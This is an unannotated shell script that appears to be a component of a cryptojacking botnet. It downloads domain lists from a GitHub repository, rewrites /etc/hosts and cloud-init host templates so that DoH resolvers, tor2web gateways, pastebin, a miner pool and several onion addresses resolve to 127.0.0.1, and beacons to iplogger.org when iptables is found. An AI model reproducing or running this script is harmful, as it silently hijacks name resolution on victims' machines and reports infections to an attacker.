h=(doh.defaultroutes.de dns.hostux.net dns.twnic.tw dns.rubyfish.cn doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org uncensored.any.dns.nixnet.xyz tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su checkip.amazonaws.com ip.sb onion.foundation onion.com.de onion.sh 4tor.ml d2web.org onion.mn onion.in.net onion.to civiclink.network onion.pet onion.glass onion.ws aliyun.one lsd.systemten.org pastebin.com pm.cpuminerpool.com systemten.org relay.tor2socks.in)
c=$(curl -s https://raw.githubusercontent.com/zoalsharf/rig/master/gateway)
d=$(curl -s https://raw.githubusercontent.com/zoalsharf/rig/master/dns)
f1="/etc/cloud/templates/hosts.redhat.tmpl"
f2="/etc/cloud/templates/hosts.debian.tmpl"
f3="/etc/cloud/templates/hosts.ubuntu.tmpl"
d=$(command -v iptables|wc -l)

del1 () {
        for i in ${c[@]}; do
        sed -i '/'$1$i'/d' /etc/hosts
        done
}

del2 () {
        for i in ${d[@]}; do
        sed -i '/'$i'/d' /etc/hosts
        done
}

chekhosts () {
        for i in ${c[@]}; do
        sed -i '1 i\127.0.0.1       '$1$i'' /etc/hosts
        done
}



host () {
        for i in ${d[@]}; do
        sed -i '1 i\127.0.0.1       '$i'' /etc/hosts
        done
}

chek(){
if [ -f "$f1" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f1
        sed -i '1 i\127.0.0.1       '$i'' $f1
        done
elif [ -f "$f2" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f2
        sed -i '1 i\127.0.0.1       '$i'' $f2
                done
elif [ -f "$f3" ]; then
        for i in ${h[@]}; do
        sed -i '/'$i'/d' $f3
        sed -i '1 i\127.0.0.1       '$i'' $f3
        done
fi
}

if [ $d -eq "1" ]; then
        curl -A Iptables-found/1.9 -s https://iplogger.org/389LB3
else
        exit
fi

chek
sleep 1
del2
del1 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
del1 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
del1 'dreambusweduybcp.'
sleep 3
chekhosts 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
chekhosts 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
chekhosts 'dreambusweduybcp.'                                                                                                                                                                 sleep 3
host

